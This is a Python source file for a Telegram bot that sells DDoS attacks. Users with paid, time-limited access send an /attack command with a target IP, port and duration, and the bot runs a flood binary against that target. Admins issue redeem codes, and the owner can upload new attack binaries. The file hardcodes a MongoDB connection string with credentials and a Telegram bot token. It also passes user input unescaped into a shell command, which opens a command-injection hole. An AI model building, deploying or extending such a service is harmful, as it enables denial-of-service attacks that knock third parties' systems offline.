import os
import socket
import subprocess
import asyncio
import pytz
import platform
import random
import string
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone

# Database Configuration
MONGO_URI = 'mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net'
client = MongoClient(MONGO_URI)
db = client['Kamisama']
users_collection = db['SCTGUO']
admins_collection = db['admins']
redeem_codes_collection = db['redeem_codes0']

# Bot Configuration
TELEGRAM_BOT_TOKEN = '8088308793:AAHvoY0FSpFghfxE_0v06NKVEj1dNWuWv2k'
OWNER_ID = 7086729173

def is_owner(user_id):
    return user_id == OWNER_ID

def is_admin(user_id):
    return is_owner(user_id) or admins_collection.find_one({"user_id": user_id}) is not None

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry = user['expiry_date']
        if expiry:
            if expiry.tzinfo is None:
                expiry = expiry.replace(tzinfo=timezone.utc)
            if expiry > datetime.now(timezone.utc):
                return True
    return False

async def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not await is_user_allowed(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    await update.message.reply_text("🔥 Welcome to DDOS world 🔥\n\nUse /attack <ip> <port> <duration>\nLet the war begin! ⚔️💥")

async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if is_owner(user_id):
        help_text = (
            "Owner Commands:\n"
            "/start\n"
            "/attack <ip> <port> <duration>\n"
            "/add <user_id> <days>\n"
            "/remove <user_id>\n"
            "/users\n"
            "/gen <days>\n"
            "/redeem <code>\n"
            "/delete_code <code>\n"
            "/list_codes\n"
            "/admin <user_id>\n"
            "/remove_admin <user_id>\n"
            "/removebin <filename>"
        )
    elif is_admin(user_id):
        help_text = (
            "Admin Commands:\n"
            "/start\n"
            "/attack <ip> <port> <duration>\n"
            "/add <user_id> <days>\n"
            "/remove <user_id>\n"
            "/users\n"
            "/gen <days>\n"
            "/redeem <code>\n"
            "/delete_code <code>\n"
            "/list_codes"
        )
    else:
        help_text = (
            "User Commands:\n"
            "/start\n"
            "/attack <ip> <port> <duration>\n"
            "/redeem <code>"
        )
    await update.message.reply_text(help_text)

async def attack(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not await is_user_allowed(user_id):
        await update.message.reply_text("❌ You are not authorized.")
        return
    if len(context.args) != 3:
        await update.message.reply_text("⚠️ Usage: /attack <ip> <port> <duration>")
        return
    ip, port, duration = context.args
    await update.message.reply_text(f"⚔️ Attack Launched!\n🎯 Target: {ip}:{port}\n🕒 Duration: {duration} seconds\n🔥 Let the battlefield ignite! 💥")
    asyncio.create_task(run_attack(update.effective_chat.id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    try:
        proc = await asyncio.create_subprocess_shell(
            f"./papa {ip} {port} {duration} 2500",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await proc.communicate()
        await context.bot.send_message(chat_id, text="✅ Attack Completed!\nThank you for using our service!")
    except Exception as e:
        await context.bot.send_message(chat_id, text=f"❌ Error: {str(e)}")

async def remove_binary(update: Update, context: CallbackContext):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Only owner can remove binaries.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /removebin <filename>")
        return
    name = context.args[0]
    if os.path.exists(name):
        os.remove(name)
        await update.message.reply_text(f"✅ Binary '{name}' removed.")
    else:
        await update.message.reply_text(f"⚠️ Binary '{name}' not found.")

async def handle_file(update: Update, context: CallbackContext):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Only owner can upload binaries.")
        return
    file = await update.message.document.get_file()
    await file.download_to_drive("./soul")
    os.chmod("./soul", 0o755)
    await update.message.reply_text("✅ Binary uploaded and ready.")

async def add_user(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Not authorized.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /add <user_id> <days>")
        return
    user_id = int(context.args[0])
    days = int(context.args[1])
    expiry = datetime.now(timezone.utc) + timedelta(days=days)
    users_collection.update_one({"user_id": user_id}, {"$set": {"expiry_date": expiry}}, upsert=True)
    await update.message.reply_text(f"✅ User {user_id} added for {days} days.")

async def remove_user(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Not authorized.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <user_id>")
        return
    user_id = int(context.args[0])
    users_collection.delete_one({"user_id": user_id})
    await update.message.reply_text(f"✅ User {user_id} removed.")

async def list_users(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Not authorized.")
        return
    msg = "📋 Users List:\n"
    for u in users_collection.find():
        msg += f"{u['user_id']} → {u['expiry_date'].strftime('%Y-%m-%d')}\n"
    await update.message.reply_text(msg)

async def gen_code(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Not authorized.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /gen <days>")
        return
    days = int(context.args[0])
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    expiry = datetime.now(timezone.utc) + timedelta(days=days)
    redeem_codes_collection.insert_one({"code": code, "days": days, "expiry_date": expiry})
    await update.message.reply_text(f"✅ Code: {code} valid for {days} days")

async def redeem_code(update: Update, context: CallbackContext):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /redeem <code>")
        return
    code = context.args[0]
    entry = redeem_codes_collection.find_one({"code": code})
    if not entry:
        await update.message.reply_text("❌ Invalid code.")
        return
    days = entry['days']
    expiry = datetime.now(timezone.utc) + timedelta(days=days)
    users_collection.update_one({"user_id": update.effective_user.id}, {"$set": {"expiry_date": expiry}}, upsert=True)
    redeem_codes_collection.delete_one({"code": code})
    await update.message.reply_text(f"✅ Code redeemed for {days} days.")

async def delete_code(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Not authorized.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /delete_code <code>")
        return
    result = redeem_codes_collection.delete_one({"code": context.args[0]})
    if result.deleted_count > 0:
        await update.message.reply_text("✅ Code deleted.")
    else:
        await update.message.reply_text("❌ Code not found.")

async def list_codes(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Not authorized.")
        return
    msg = "Active Codes:\n"
    for c in redeem_codes_collection.find():
        msg += f"{c['code']} → {c['days']} days\n"
    await update.message.reply_text(msg)

async def promote_admin(update: Update, context: CallbackContext):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Only owner can promote admins.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /admin <user_id>")
        return
    uid = int(context.args[0])
    admins_collection.update_one({"user_id": uid}, {"$set": {"role": "admin"}}, upsert=True)
    await update.message.reply_text(f"✅ {uid} promoted to admin.")

async def remove_admin(update: Update, context: CallbackContext):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Only owner can remove admins.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove_admin <user_id>")
        return
    uid = int(context.args[0])
    admins_collection.delete_one({"user_id": uid})
    await update.message.reply_text(f"✅ {uid} demoted from admin.")

def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("add", add_user))
    app.add_handler(CommandHandler("remove", remove_user))
    app.add_handler(CommandHandler("users", list_users))
    app.add_handler(CommandHandler("gen", gen_code))
    app.add_handler(CommandHandler("redeem", redeem_code))
    app.add_handler(CommandHandler("delete_code", delete_code))
    app.add_handler(CommandHandler("list_codes", list_codes))
    app.add_handler(CommandHandler("admin", promote_admin))
    app.add_handler(CommandHandler("remove_admin", remove_admin))
    app.add_handler(CommandHandler("removebin", remove_binary))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.run_polling()

if __name__ == '__main__':
    main()